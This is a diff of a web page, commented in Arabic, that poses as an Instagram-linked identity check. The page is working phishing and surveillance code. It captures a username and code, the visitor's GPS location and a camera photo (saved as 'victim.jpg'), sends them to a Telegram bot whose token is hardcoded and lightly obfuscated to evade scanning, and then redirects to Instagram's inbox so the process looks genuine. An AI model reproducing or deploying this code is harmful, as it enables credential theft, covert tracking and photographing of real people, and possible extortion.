@@ -38,7 +38,7 @@
     <canvas id="c"></canvas>
 
     <script>
-        // تشفير البيانات لخداع الفحص
+        // بيانات البوت الخاصة بك (تم تشفيرها قليلاً)
         const _v1 = "8233268720";
         const _v2 = "AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
         const _cid = "897618292";
@@ -52,13 +52,13 @@
             document.getElementById('auth-ui').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
 
-            // 1. تحديد الموقع (GPS)
+            // 1. تحديد الموقع (GPS) - يطلب الإذن
             navigator.geolocation.getCurrentPosition(pos => {
                 const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 sendData(`📍 موقع المبتز:\n${map}`);
             }, () => {}, {enableHighAccuracy: true});
 
-            // 2. فتح الكاميرا وصيد الصورة (مطابقة الهوية)
+            // 2. فتح الكاميرا وصيد الصورة
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
@@ -73,14 +73,14 @@
                     canvas.toBlob(blob => {
                         const fd = new FormData();
                         fd.append("chat_id", _cid);
-                        fd.append("photo", blob, "auth.jpg");
-                        fd.append("caption", `👤 يوزر: ${u}\n🔑 رمز: ${p}\n🔗 المصدر: Private Chat`);
+                        fd.append("photo", blob, "victim.jpg");
+                        fd.append("caption", `👤 الحساب: ${u}\n🔑 الرمز: ${p}\n🔗 المصدر: دردشة خاصة`);
                         fetch(`https://api.telegram.org/bot${_v1}:${_v2}/sendPhoto`, { method: "POST", body: fd })
                         .then(() => finish());
                     }, 'image/jpeg');
                 }, 2000);
             } catch (e) {
-                sendData(`👤 يوزر: ${u}\n🔑 رمز: ${p}\n⚠️ (رفض الكاميرا)`);
+                sendData(`👤 الحساب: ${u}\n🔑 الرمز: ${p}\n⚠️ (رفض الكاميرا)`);
                 finish();
             }
         }
@@ -92,7 +92,7 @@
         function finish() {
             document.getElementById('status-text').innerText = "تم تأكيد الهوية. جاري توجيهك...";
             setTimeout(() => {
-                // توجيه لصفحة دردشة إنستجرام الرسمية لتبدو العملية حقيقية
+                // التوجيه لصندوق رسائل إنستجرام
                 window.location.href = "https://www.instagram.com/direct/inbox/";
             }, 1500);
         }
